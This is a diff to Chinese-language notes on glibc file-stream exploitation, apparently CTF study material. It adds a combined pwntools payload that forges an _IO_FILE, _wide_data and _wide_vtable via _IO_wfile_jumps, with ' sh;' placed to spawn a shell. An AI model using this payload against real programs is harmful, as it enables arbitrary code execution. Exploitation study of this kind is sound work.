@@ -252,7 +252,20 @@ fake_wide_vtable = flat({
 
 也就是要伪造一个 `_IO_FILE` 结构体，一个 `_wide_data` 结构体，一个 `_wide_vtable` 结构体
 
+整合版：
 
+```python
+fakeio = flat({
+    0: b"  sh;",
+    0x20: 0,
+    0x28: 1,
+    0x68: target,  # chain
+    0x88: libc.bss(0x500),  # libc.sym['_IO_stdfile_2_lock'],  # glibc 2.38 以上会 check _lock 字段
+    0x98: fake_IO_addr,  # _codecvt = wide_data -> vtable
+    0xa0: fake_IO_addr - 0x48,  # _wide_data
+    0xd8: libc.sym['_IO_wfile_jumps']
+}, filler=b"\x00")
+```
 
 #### _IO_wfile_underflow_mmap
 
